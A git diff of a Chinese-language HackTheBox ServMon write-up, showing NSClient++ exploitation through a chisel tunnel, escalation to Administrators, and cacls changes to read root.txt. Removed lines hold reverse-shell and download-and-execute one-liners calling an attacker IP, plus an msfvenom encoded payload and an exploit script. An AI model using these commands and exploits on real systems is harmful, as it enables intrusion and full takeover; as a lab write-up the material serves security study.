@@ -240,7 +240,7 @@ windows连接
 > .\chisel.exe client 10.10.14.16:8000 R:8443:localhost:8443
 
 
-现在浏览器打开```https://10.10.10.184:8443/```再输入密码，报```403 Invalid password```
+现在浏览器打开```https://127.0.0.1:8443/```再输入密码，报```403 Invalid password```
 
 说明现在我们是允许登陆这个后台的
 
@@ -277,59 +277,110 @@ Current password: ew2x6SsGTxjRwXOT
 
 登陆密码是：```ew2x6SsGTxjRwXOT```
 
+根据```NSClient++```关键字，我们在谷歌找到了[这个远程执行代码的exp](https://www.exploit-db.com/exploits/48360)
 
-msfvenom -p cmd/windows/reverse_powershell lhost=10.10.14.16 lport=4444 > evil.bat
+在这里我试过非常非常多的反弹shell的方法，因为靶机有个antivirus，很多exe文件都不能执行，powershell也不能反弹shell，苦恼。。。
 
+假设这个程序是以超级管理员权限执行的，那么应该不需要反弹shell，把当前用户提升到管理员权限也是可以的
 
+查看当前用户组，在users组
+```
+nadine@SERVMON c:\Temp>net user nadine
+User name                    Nadine
+Full Name
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
 
-powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.16:8088/nc.exe','C:\temp\nc.exe')"
+Password last set            14/01/2020 20:36:20                                                                                                                                                               
+Password expires             Never
+Password changeable          14/01/2020 20:36:20                                                                                                                                                               
+Password required            Yes
+User may change password     No
 
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   08/12/2021 14:55:43                                                                                                                                                               
 
+Logon hours allowed          All
+
+Local Group Memberships      *Users
+Global Group memberships     *None
+The command completed successfully.
+```
+
+执行提权，把nadine加到Administrators组
+```
+┌──(root💀kali)-[~/htb/ServMon]
+└─# python3 exp.py -t 127.0.0.1 -P 8443 -p 'ew2x6SsGTxjRwXOT' -c 'cmd.exe /c net localgroup Administrators /add nadine'                                                                                       1 ⨯
+[!] Targeting base URL https://127.0.0.1:8443
+[!] Obtaining Authentication Token . . .
+[+] Got auth token: frAQBc8Wsa1xVPfvJcrgRYwTiizs2trQ
+[!] Enabling External Scripts Module . . .
+[!] Configuring Script with Specified Payload . . .
+[+] Added External Script (name: LnEZSwPpcJ)
+[!] Saving Configuration . . .
+[!] Reloading Application . . .
+[!] Waiting for Application to reload . . .
+[!] Obtaining Authentication Token . . .
+[+] Got auth token: frAQBc8Wsa1xVPfvJcrgRYwTiizs2trQ
+[!] Triggering payload, should execute shortly . . .
+```
+
+再次查看，已加到管理员组
+```
+nadine@SERVMON c:\Temp>net user nadine
+User name                    Nadine
+Full Name
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            14/01/2020 20:36:20                                                                                                                                                               
+Password expires             Never
+Password changeable          14/01/2020 20:36:20                                                                                                                                                               
+Password required            Yes
+User may change password     No
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   08/12/2021 14:55:43                                                                                                                                                               
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators       *Users
+Global Group memberships     *None
+The command completed successfully.
+```
+
+需注意，上面命令执行完成以后，我们还不能马上使得命令生效，需要退出当前ssh，重新登录
+
+现在我们已经可以进管理员目录看到root.txt，但是还是没有查看权限。。
+```
+nadine@SERVMON C:\Users\Administrator>cd Desktop
+
+nadine@SERVMON C:\Users\Administrator\Desktop>type root.txt
+Access is denied.
 
 
 ```
-#!/usr/bin/python3
-#automated way of exploiting vulnerabale NSClient++ 0.5.2.35 for privilege escalation.
-#original exploit: https://www.exploit-db.com/exploits/46802
-import requests
-import argparse
-import urllib3
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-parser = argparse.ArgumentParser(description='NSClient++ 0.5.2.35 - Privilege Escalation Script')
-parser.add_argument('command', help='command to execute on victim machine')
-parser.add_argument('host', help='host + port of the target. For example: https://192.168.0.100:443')
-parser.add_argument('password', help='password for the user of the application')
+修改root.txt文件的权限，nadine可以对其完全控制
 
-args = parser.parse_args()
+```
+nadine@SERVMON C:\Users\Administrator\Desktop>Cacls C:\Users\Administrator\Desktop\root.txt /t /e /c /g nadine:F
+processed file: C:\Users\Administrator\Desktop\root.txt
 
-response = requests.put(args.host+'/api/v1/scripts/ext/scripts/exploit1.bat', data=args.command, verify=False, auth=('admin', args.password))
-print(response)
-response = requests.get(args.host+'/api/v1/queries/exploit1/commands/execute?time=1m', verify=False, auth=('admin', args.password))
-print(response)
+nadine@SERVMON C:\Users\Administrator\Desktop>type root.txt
+{就不告诉你：）}
 ```
 
-./exp2.py "C:\\Temp\\nc.exe " https://127.0.0.1:8443 ew2x6SsGTxjRwXOT
-
-
-
-powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.16:8088/shell.exe','C:\temp\shell.exe')"
-
-
-nc 10.10.14.16 4242 -e cmd
-
-
-powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.10.14.16:8088/shell.ps1')|iex"
-
-powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.16:8088/shell.ps1')"
-
-Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.16:8088/shell.ps1')"
-
-
-echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.16:8088/shell.ps1') | powershell -noprofile
-
-mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
-
-
-
-msfvenom  --platform windows -p  cmd/windows/reverse_powershell lhost=10.10.14.16 lport=4444 -b "\x00" -e x86/shikata_ga_nai -i 20 -o shell.exe
+成功读取到root.txt
